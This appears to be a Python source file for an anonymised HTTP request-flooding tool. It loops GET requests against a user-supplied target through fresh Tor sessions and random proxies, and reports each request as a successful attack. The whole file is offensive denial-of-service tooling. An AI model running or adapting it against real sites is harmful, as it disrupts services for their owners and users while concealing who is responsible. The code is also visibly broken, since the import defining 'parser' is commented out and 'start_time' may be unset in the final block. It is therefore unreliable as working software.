import datetime
import sys
import random
from lib.color import color
from lib.tor import Tor

def main():
    counter = 0
    try:
        tor = Tor()
        if not tor.tor_installed():
            print('{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END))
            sys.exit(1)

        start_time = datetime.datetime.now().time().strftime('%H:%M:%S')

        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]

        while counter < max_attempts:
            counter += 1
            proxy = random.choice(proxies)
            session = tor.new_session(proxies={'http': proxy, 'https': proxy})
            if session is None:
                print('{}[!]{} Failed to initialize Tor session. Exiting...'.format(color.RED, color.END))
                sys.exit(1)

            print('{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END))
            print('\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))

            try:
                print('{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target))
                session.get(target)
                print('{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target))
            except Exception as e:
                print('{}[!]{} Error: {}'.format(color.RED, color.END, e))

    except KeyboardInterrupt:
        pass
    except Exception as exception:
        print('\n{}[!]{} An error has occurred:'.format(color.RED, color.END))
        print('{}{}{}'.format(color.RED, exception, color.END))
    finally:
        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
        total_time = datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S')
        print('{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time))
        print('{}[+]{} Number of requests:\t{}'.format(color.GREEN, color.END, counter))
        print('{}[!]{} Stopping Tor...'.format(color.RED, color.END))
        tor.stop_tor()
        print('{}[!]{} Exiting...\n'.format(color.RED, color.END))
        sys.exit(0)

if __name__ == '__main__':
    # Processing args from lib.args import *
    args = parser.parse_args()
    target = args.target
    max_attempts = args.max_attempts
    # Print help and exit when it runs without target arg
    if not target:
        parser.print_help(sys.stdout)
        sys.exit(2)
    # Run the main execution
    main()
